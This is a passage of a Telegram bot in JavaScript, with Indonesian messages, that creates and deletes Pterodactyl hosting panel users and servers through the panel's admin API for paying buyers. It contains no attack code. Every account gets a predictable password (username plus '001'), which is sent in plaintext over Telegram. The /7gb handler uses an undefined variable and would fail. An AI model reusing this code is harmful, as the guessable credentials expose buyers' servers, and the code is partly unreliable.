          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya😁
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

 PANEL DATA ANDA :
×͜× Login : ${domain}
×͜× Username : ${user.username}
×͜× Password : ${password} 
┏━━━━━━━⬣
│• Jangan Ddos Server
│• Wajib tutup domain saat screenshot
│• Jngan bagikan domain ke siapapun
┗━━━━━━━━━━━━━━━━━━⬣
𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗕𝗬 𝗢𝗧𝗔𝗫`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!🔥"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan😮‍💨.");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 3gb
// 3gb
bot.onText(/\/3gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /3gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "3gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "3072";
  const cpu = "90";
  const disk = "3072";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = "https://files.catbox.moe/587otn.jpg";
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di data panel vemos.");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya😁
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

PANEL DATA ANDA :
×͜× Login : ${domain}
×͜× Username : ${user.username}
×͜× Password : ${password} 
┏━━━━━━━⬣
│RULES :
│• Jangan Ddos Server
│• Wajib tutup domain saat screenshot
│• Jngan bagikan domain ke siapapun
┗━━━━━━━━━━━━━━━━━━⬣
𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗕𝗬 𝗢𝗧𝗔𝗫`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!🔥"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan😮‍💨.");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 4gb
bot.onText(/\/4gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /4gb namapanel,idtele");
    return;
  }
  const username = t[0];  
  const u = t[1];
  const name = username + "4gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "4048";
  const cpu = "110";
  const disk = "4048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = "https://files.catbox.moe/587otn.jpg";
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya😁
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

 PANEL DATA ANDA :
×͜× Login : ${domain}
×͜× Username : ${user.username}
×͜× Password : ${password} 
┏━━━━━━━⬣
│ RULES :
│• Jangan Ddos Server
│• Wajib tutup domain saat screenshot
│• Jngan bagikan domain ke siapapun
┗━━━━━━━━━━━━━━━━━━⬣
𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗕𝗬 𝗢𝗧𝗔𝗫`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!🔥"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan😮‍💨.");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 5gb
bot.onText(/\/5gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /5gb namapanel,idtele");
    return;
  }
  const username = t[0]; 
  const u = t[1];
  const name = username + "5gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "5048";
  const cpu = "140";
  const disk = "5048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = "https://files.catbox.moe/587otn.jpg";
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di panel vemos.");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya😁
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

PANEL DATA ANDA :
×͜× Login : ${domain}
×͜× Username : ${user.username}
×͜× Password : ${password} 
┏━━━━━━━⬣
│RULES :
│• Jangan Ddos Server
│• Wajib tutup domain saat screenshot
│• Jngan bagikan domain ke siapapun
┗━━━━━━━━━━━━━━━━━━⬣
𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗕𝗬 𝗢𝗧𝗔𝗫`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!🔥"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan😮‍💨.");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/delsrv (.+)/, async (msg, match) => {
 const chatId = msg.chat.id;
 const senderId = msg.from.id;
 const srv = match[1].trim();

const userId = msg.from.id;
  if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }

  if (!srv) {
    bot.sendMessage(
      chatId,
      "Mohon masukkan ID server yang ingin dihapus, contoh: /delsrv 1234"
    );
    return;
  }

  try {
    let f = await fetch(domain + "/api/application/servers/" + srv, {
      method: "DELETE",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
    });

    let res = f.ok ? { errors: null } : await f.json();

    if (res.errors) {
      bot.sendMessage(chatId, "SERVER TIDAK ADA");
    } else {
      bot.sendMessage(chatId, "SUCCESFULLY DELETE SERVER");
    }
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, "Terjadi kesalahan saat menghapus server.");
  }
});

bot.onText(/\/6gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /6gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "6gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "6048";
  const cpu = "170";
  const disk = "6048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = "https://files.catbox.moe/587otn.jpg";
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di panel vemos.");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya😁
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

 PANEL DATA ANDA :
×͜× Login : ${domain}
×͜× Username : ${user.username}
×͜× Password : ${password} 
┏━━━━━━━⬣
│RULES :
│• Jangan Ddos Server
│• Wajib tutup domain saat screenshot
│• Jngan bagikan domain ke siapapun
┗━━━━━━━━━━━━━━━━━━⬣
𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗕𝗬 𝗢𝗧𝗔𝗫`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!🔥"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan😮‍💨.");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 7gb
bot.onText(/\/7gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /7gb namapanel,idtele");
    return;
  }
  const username = t[0];  
  const u = t[1];
  const name = username + "7gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "7048";
  const cpu = "200";
  const disk = "7048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = "https://files.catbox.moe/587otn.jpg";
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di panel vemos.");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya😁
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

 PANEL DATA ANDA :
×͜× Login : ${domain}
×͜× Username : ${user.username}
×͜× Password : ${password} 
┏━━━━━━━⬣
│• Jangan Ddos Server
│• Wajib tutup domain saat screenshot
│• Jngan bagikan domain ke siapapun
┗━━━━━━━━━━━━━━━━━━⬣
𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗕𝗬 𝗢𝗧𝗔𝗫`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!🔥"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan😮‍💨.");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 8gb
bot.onText(/\/8gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /8gb namapanel,idtele");
    return;
  }
  const username = t[0];  
  const u = t[1];
  const name = username + "8gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "8048";
  const cpu = "230";
  const disk = "8048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = "https://files.catbox.moe/587otn.jpg";
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya😁
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

 PANEL DATA ANDA :
×͜× Login : ${domain}
×͜× Username : ${user.username}
×͜× Password : ${password} 
┏━━━━━━━⬣
│RULES :
│• Jangan Ddos Server
│• Wajib tutup domain saat screenshot
│• Jngan bagikan domain ke siapapun
┗━━━━━━━━━━━━━━━━━━⬣
𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗕𝗬 𝗢𝗧𝗔𝗫`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!🔥"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan😮‍💨.");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 9gb
bot.onText(/\/9gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /9gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "9gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "9048";
  const cpu = "260";
  const disk = "9048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = "https://files.catbox.moe/587otn.jpg";
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya😁
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

PANEL DATA ANDA :
×͜× Login : ${domain}
×͜× Username : ${user.username}
×͜× Password : ${password} 
┏━━━━━━━⬣
│RULES :
│• Jangan Ddos Server
│• Wajib tutup domain saat screenshot
│• Jngan bagikan domain ke siapapun
┗━━━━━━━━━━━━━━━━━━⬣
